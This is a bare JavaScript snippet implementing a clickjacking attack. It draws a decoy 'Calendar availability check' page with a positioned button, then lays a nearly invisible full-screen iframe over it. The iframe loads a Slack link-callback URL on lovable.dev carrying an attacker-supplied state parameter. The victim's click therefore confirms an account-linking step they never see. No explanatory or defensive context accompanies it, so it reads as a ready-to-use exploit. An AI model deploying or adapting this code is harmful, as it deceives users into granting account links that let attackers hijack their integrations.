(() => {
  const params = new URLSearchParams(location.search);
  const state = params.get("state");
  if (!state) return;

  const x = Number(params.get("x") || innerWidth / 2);
  const y = Number(params.get("y") || innerHeight * 0.52);

  document.body.innerHTML = `
    <main style="position:fixed;inset:0;display:grid;place-items:center;background:#f8fafc;font-family:system-ui,sans-serif">
      <section style="text-align:center;color:#0f172a">
        <h1 style="margin:0;font-size:24px">Calendar availability check</h1>
        <p style="margin:8px 0;color:#64748b">One click verifies the suggested meeting time.</p>
      </section>
      <button style="position:fixed;left:${x - 110}px;top:${y - 22}px;width:220px;height:44px;border:0;border-radius:9px;background:#2563eb;color:white;font-size:15px;font-weight:700">Check availability</button>
    </main>`;

  const target = document.createElement("iframe");
  target.title = "Calendar verification";
  target.src = "https://lovable.dev/slack/link-callback?state=" + encodeURIComponent(state);
  Object.assign(target.style, {
    position: "fixed",
    inset: "0",
    width: "100%",
    height: "100%",
    border: "0",
    opacity: "0.006",
    zIndex: "2147483647",
  });
  document.body.append(target);
  document.documentElement.dataset.ready = "true";
})();

window.runWidget = () => {};
